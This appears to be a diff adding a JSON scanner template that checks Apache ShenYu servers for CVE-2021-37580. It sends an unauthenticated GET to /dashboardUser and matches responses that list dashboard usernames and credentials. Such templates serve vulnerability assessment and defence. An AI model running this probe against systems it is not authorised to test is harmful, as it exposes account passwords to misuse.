@@ -1,0 +1,36 @@
+{
+    "Name": "Apache-ShenYu账号密码泄漏漏洞",
+    "Description": " Apache ShenYu dashboardUser 账号密码泄漏漏洞 CVE-2021-37580",
+    "Product": "apache",
+    "author": "chumeng",
+    "Request":[
+        {
+        "Method": "GET",
+        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
+        "Uri":"/dashboardUser",
+        "Port":"",
+        "Data":"",
+        "Follow_redirects":"false",
+        "Upload":{"Name": "","fileName": "","filePath": "" },
+        "Response":{
+        "Check_Steps":"AND",
+        "Checks": [
+                {
+                "Operation": "contains", 
+                "Key":"",
+                "Value": "query dashboard users success"
+                }, {
+                    "Operation": "contains", 
+                    "Key":"",
+                    "Value": "username"
+                    },
+                 {
+                "Operation": "code", 
+                "Key":"",
+                "Value": "200"  
+                 }
+        ]
+        },
+        "Next_decide":""
+                }
+]}
